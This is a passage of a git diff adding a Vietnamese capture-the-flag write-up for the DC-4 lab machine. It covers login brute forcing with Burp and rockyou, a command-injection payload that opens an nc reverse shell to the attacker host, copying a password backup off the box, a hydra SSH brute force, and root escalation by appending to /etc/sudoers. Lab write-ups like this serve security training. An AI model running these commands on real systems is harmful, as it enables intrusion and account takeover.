@@ -1530,3 +1530,162 @@ database()
 
 ```
 
+# DC-4
+
+## Recon
+
+```bash
+sudo nmap -T4 -sS -e eth0 172.16.1.0/24
+```
+
+![alt text](IMG/DC-4/image.png)
+
+```bash
+nmap -p- -sV 172.16.1.131
+```
+
+![alt text](IMG/DC-4/image-1.png)
+
+Ta thực hiện tuy cập trang web thấy xuất hiện như sau:
+
+![alt text](IMG/DC-4/image-2.png)
+
+## Login Brute Force
+
+Bây giờ ta sẽ thực hiện tấn công brute force mật khâu sử dụng burp.
+
+![alt text](IMG/DC-4/image-3.png)
+
+Ta sẽ cần một danh sách các mật khẩu có thể sư dụng được, chúng ta sẽ sử dụng ile rockyou.txt và sẽ mất một chút kha khá thời gian.
+
+![alt text](IMG/DC-4/image-4.png)
+
+Khi thực hiện tấn công ta sẽ có những kết quar sau:
+
+![alt text](IMG/DC-4/image-5.png)
+
+Ta thấy là ở đây có rất nhiều kết quả có thê xảy ra và hầu hết có độ dai 499 nhưng nó không phải là thông tind đăng nhập chính xác, và ở dưới có gói tin với độ dai 660 với pass là `happy` chính là thông tin chúng ta có thê đăng nhập. 
+
+![alt text](IMG/DC-4/image-6.png)
+
+Như vậy chúng ta đăng nhập thành công.
+
+## Reverse Shell
+
+Chúng ta thấy có giao diện như sau:
+
+![alt text](IMG/DC-4/image-7.png)
+
+![alt text](IMG/DC-4/image-8.png)
+
+Màn hình đang hiển thị kết quả của câu lệnh `ls -l`, nó nói là bạn đang đăng nhập và hiện thị kết quả cua câu lệnh đó, như vậy chúng ta có thê sử dụng burp để có truyền câu lệnh command mà chúng ta mong muốn vào, ta sẽ thực hiện reverse shell.
+
+Trên linux:
+
+```bash
+nc -lvnp 3333
+```
+
+![alt text](IMG/DC-4/image-9.png)
+
+```bash
+radio=nc -e /bin/sh 172.16.1.128 3333&submit=Run
+```
+
+![alt text](IMG/DC-4/image-10.png)
+
+Khi ta thực hiện Send to Repeater thì ta nhận thấy ở máy kali đã có một phiên kết nối tới:
+
+![alt text](IMG/DC-4/image-11.png)
+
+```bash
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+![alt text](IMG/DC-4/image-12.png)
+
+Như vậy chúng ta có thê thấy giống như kết quả hiện ở trên màn hình dưới kia.
+
+## Brute force SSH
+
+```bash
+ls /home
+```
+
+ta thấy có 3 user là charles, jim, sam. Ta thực hiện khám phá các user đó, trrước tiên là sam:
+
+```bash
+ls -la /home/sam
+ls -la /home/jim
+```
+
+![alt text](IMG/DC-4/image-14.png)
+
+Ta thấy có một thư mục backup, ta xem nội dung bên tronh.
+
+```bash
+ls -la /home/jim/backups
+```
+
+![alt text](IMG/DC-4/image-15.png)
+
+Nó sẽ là một danh sách các mật khẩu:
+
+![alt text](IMG/DC-4/image-16.png)
+
+Ta thực hiện tải file đó về máy tính kali của chúng ta:
+
+```bash
+cd /home/jim/backups/
+python3 -m http.server
+```
+
+![alt text](IMG/DC-4/image-17.png)
+
+```bash
+wget 172.16.1.131:8000/old-passwords.bak
+```
+
+![alt text](IMG/DC-4/image-18.png)
+
+Sau khi có mật khâu backup ta thực hiện brute force ssh băng hydra:
+
+```bash
+hydra -l jim -P old-passwords.bak 172.16.1.131 ssh -t 60
+```
+
+![alt text](IMG/DC-4/image-19.png)
+
+Như vậy đến đây ta đã có mật khẩu ssh của jim là `jibril04`.
+
+## Fun Mail
+
+Khi ta thực hiện ssh vào thì ta thấy có một thông báo có mail dành cho jim:
+
+![alt text](IMG/DC-4/image-20.png)
+
+Đọc mail này xong chúng ta có nốt mật khẩu của charles là `^xHhA&hvim0y`. Chuyển sang tài khoan của `charles`.
+
+![alt text](IMG/DC-4/image-21.png)
+
+### Root Flag
+
+Như vậy chúng ta có một câu lệnh có quyền root nhưng mà không cần passwd. Tiếc là câu lệnh này không phải câu lệnh gốc ở trên linux. Ta sẽ thực hiện xem chức năng chính của câu lệnh này:
+
+```bash
+/usr/bin/teehee --help
+```
+
+![alt text](IMG/DC-4/image-22.png)
+
+Quá tuyệt vời câu lệnh này cho phép ghi nối thêm vào file nhưng không ghi đè, được ghi vào file mà có cả quyền root thì ta có thể cung cấp cho của user `charles` thực thi sudo cho mọi lệnh.
+
+```bash
+echo "charles ALL=(ALL:ALL) ALL" | sudo teehee -a /etc/sudoers
+```
+
+Thành công!
+
+![alt text](IMG/DC-4/image-23.png)
+
+![alt text](IMG/DC-4/image-24.png)
